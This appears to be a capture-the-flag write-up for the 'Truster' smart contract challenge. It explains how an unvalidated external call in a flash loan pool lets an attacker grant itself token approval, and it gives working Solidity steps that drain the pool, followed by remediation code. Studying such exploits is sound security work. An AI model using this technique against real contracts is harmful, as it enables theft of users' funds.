# Challenge #3: Truster

- **Difficulty**: Easy
- **Category**: Arbitrary External Call
- **Severity**: Critical
- **Status**: SOLVED

## Overview

The TrusterLenderPool offers flash loans with a unique (and dangerous) feature: it executes an arbitrary external call on behalf of the borrower as part of the loan process. The pool holds 1 million DVT tokens.

## Vulnerability

The `flashLoan()` function accepts a `target` address and arbitrary `data`, then executes an unvalidated external call:

```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external nonReentrant returns (bool) {
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    target.functionCall(data);  // Arbitrary call with pool as msg.sender

    if (token.balanceOf(address(this)) < balanceBefore)
        revert RepayFailed();
    return true;
}
```

The critical issue: `target.functionCall(data)` executes with `msg.sender == address(pool)`. An attacker can craft `data` to call `token.approve(attacker, type(uint256).max)` on the DVT token contract. Since the pool is the caller, the approval is set on the pool's tokens. The flash loan amount can be 0, so no repayment is needed — the attacker only needs the side effect of the arbitrary call.

## Exploit Walkthrough

**Step 1**: Encode an `approve()` call targeting the DVT token:

```solidity
bytes memory data = abi.encodeCall(
    IERC20.approve,
    (player, type(uint256).max)
);
```

**Step 2**: Execute a zero-amount flash loan with the token contract as the target:

```solidity
pool.flashLoan(0, player, address(token), data);
```

The pool calls `token.approve(player, type(uint256).max)` as `msg.sender`, granting the attacker unlimited allowance over the pool's tokens. The balance check passes since 0 tokens were borrowed.

**Step 3**: Drain the pool using the approval:

```solidity
token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
```

All 1 million DVT tokens are transferred to the recovery address. The entire attack can be executed in a single transaction using an attacker contract.

## Real-World Impact

- **bZx Flash Loan Attacks (Feb 2020)**: The first major DeFi exploits leveraged flash loans combined with external calls to manipulate protocol state, resulting in ~$1M in losses across two attacks.
- **Arbitrary call vulnerabilities** are among the most critical findings in smart contract audits. Any function that performs `target.call(data)` where both `target` and `data` are user-controlled is effectively giving the caller full control over the contract's identity.
- **ERC-20 approval phishing** through arbitrary calls has been documented in multiple audit reports, where contracts inadvertently grant token approvals through unvalidated delegatecalls or external calls.

## Remediation

```solidity
// Fix 1: Remove arbitrary external calls entirely
function flashLoan(uint256 amount, address borrower) external nonReentrant returns (bool) {
    uint256 balanceBefore = token.balanceOf(address(this));
    token.transfer(borrower, amount);
    IFlashLoanReceiver(borrower).executeOperation(amount);
    if (token.balanceOf(address(this)) < balanceBefore) revert RepayFailed();
    return true;
}

// Fix 2: If external calls are required, whitelist targets
mapping(address => bool) public allowedTargets;
require(allowedTargets[target], "Target not whitelisted");

// Fix 3: At minimum, block calls to the token contract itself
require(target != address(token), "Cannot call token contract");
```

## Key Takeaway

Never allow arbitrary external calls (`target.call(data)`) from a contract holding assets — the caller inherits the contract's identity and permissions.
